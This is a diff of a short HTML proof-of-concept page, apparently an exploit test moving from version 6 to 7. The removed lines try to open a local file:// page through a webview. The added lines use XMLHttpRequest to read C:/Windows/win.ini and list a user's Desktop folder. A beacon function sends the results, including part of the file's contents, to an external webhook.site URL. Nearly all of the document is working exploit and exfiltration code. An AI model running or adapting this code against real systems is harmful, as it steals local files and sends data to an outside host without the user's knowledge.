@@ -1,13 +1,15 @@
-<!doctype html><title>BP</title><pre>gp v6</pre>
+<!doctype html><title>BP</title><pre>gp v7 fileread</pre>
 <script>
 function beacon(s){new Image().src='https://webhook.site/05fd1420-af5c-493b-8c5d-353f67b3f438?s='+encodeURIComponent(s)}
-beacon('v6-start');
-try{
-  var wv=document.createElement('webview');
-  wv.setAttribute('src','file:///C:/Users/aaa/Downloads/poc.html');
-  wv.addEventListener('dom-ready',function(){beacon('wv-domready')});
-  document.body.appendChild(wv);
-  beacon('wv-appended');
-}catch(e){beacon('wv:'+e.message)}
-setTimeout(function(){beacon('top-nav-try');location.href='file:///C:/Users/aaa/Downloads/poc.html'},3000);
+beacon('v7-start');
+var x=new XMLHttpRequest();
+x.open('GET','file:///C:/Windows/win.ini');
+x.onload=function(){beacon('winini len='+x.responseText.length+' head='+encodeURIComponent(x.responseText.slice(0,50)))};
+x.onerror=function(){beacon('winini-fail')};
+x.send();
+var y=new XMLHttpRequest();
+y.open('GET','file:///C:/Users/aaa/Desktop/');
+y.onload=function(){beacon('desklist len='+y.responseText.length)};
+y.onerror=function(){beacon('desklist-fail')};
+y.send();
 </script>
